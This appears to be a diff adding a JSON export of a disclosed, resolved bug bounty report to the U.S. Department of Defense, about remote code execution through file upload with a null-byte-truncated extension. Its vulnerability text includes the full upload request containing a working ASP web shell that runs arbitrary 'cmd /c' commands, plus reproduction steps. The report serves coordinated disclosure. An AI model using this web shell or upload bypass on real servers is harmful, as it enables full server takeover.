@@ -1,0 +1,118 @@
+{
+  "id": 2054184,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDU0MTg0",
+  "url": "https://hackerone.com/reports/2054184",
+  "title": "RCE via File Upload  with a Null Byte Truncated File Extension at https://██████/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2023-07-06T22:06:49.775Z",
+  "submitted_at": "2023-07-06T22:08:16.576Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pizzapower",
+    "url": "/pizzapower",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/528/458/5cda4bf4bc21461f46192022291e541181e53c5d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-12-21T17:40:19.710Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-11-22T13:20:46.402Z",
+  "team_member_agreed_on_going_public_at": "2023-12-21T17:40:19.578Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI found \"repos\" at `https://███/` and `https://c█████████/` and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) `https://███████`.  There may be more, I had to fuzz a lot to find these. \n\nThese repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions. \n\nRunning the `dir` command at the uploaded file `https://████████/savefiles/poc.asp?cmd=dir`  - the shell has been deleted for security purposes. Let me know if you want me to reupload it. \n\n██████████\n\nThe request from burp - note the null byte: \n\n█████\n\n\n\n*** Reproduction ***\n\n1. Navigate to `https://███/`\n\n2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. \n\n3. Visit `https://████████/savefiles/poc.asp` and run commands. \n\n\n## Impact\n\nEverything could be compromised.\n\n## System Host(s)\n████████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\nHere is the actual request, but I'm not sure how well the null byte will translate. \n\n```\nPOST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1\nHost: ███\nCookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC\nContent-Length: 1306\nSec-Ch-Ua: \nAccept: */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB\nX-Requested-With: XMLHttpRequest\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36\nSec-Ch-Ua-Platform: \"\"\nOrigin: https://███████\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://████████/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundary7RcvHwqSCmAtKCIB\nContent-Disposition: form-data; name=\"myfile\"; filename=\"poc.asp.png\"\n\n\n<%\nSet oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\nSet oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\nSet oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\nFunction getCommandOutput(theCommand)\n    Dim objShell, objCmdExec\n    Set objShell = CreateObject(\"WScript.Shell\")\n    Set objCmdExec = objshell.exec(thecommand)\n    getCommandOutput = objCmdExec.StdOut.ReadAll\nend Function\n%>\n\n\n<HTML>\n<BODY>\n<FORM action=\"\" method=\"GET\">\n<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">\n<input type=\"submit\" value=\"Run\">\n</FORM>\n<PRE>\n<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>\n<%Response.Write(Request.ServerVariables(\"server_name\"))%>\n<p>\n<b>The server's port:</b>\n<%Response.Write(Request.ServerVariables(\"server_port\"))%>\n</p>\n<p>\n<b>The server's software:</b>\n<%Response.Write(Request.ServerVariables(\"server_software\"))%>\n</p>\n<p>\n<b>The server's local address:</b>\n<%Response.Write(Request.ServerVariables(\"LOCAL_ADDR\"))%>\n<% szCMD = request(\"cmd\")\nthisDir = getCommandOutput(\"cmd /c\" & szCMD)\nResponse.Write(thisDir)%>\n</p>\n<br>\n</BODY>\n</HTML>\n\n\n\n------WebKitFormBoundary7RcvHwqSCmAtKCIB--\n\n```\n\n*** Reproduction ***\n\n1. Navigate to `https://███/`\n\n2. Submit a file upload the same as the request I made above. Make sure there is a null byte between asp and png. \n\n3. Visit `https://████/savefiles/poc.asp` and run commands.\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 32,
+  "voters": [
+    "orange303",
+    "pizzapower",
+    "k0ns0l",
+    "exec_iq",
+    "shreyaschavhan",
+    "shubham_srt",
+    "c4sper0",
+    "mr_anksec",
+    "0xtrav",
+    "eminfidan",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
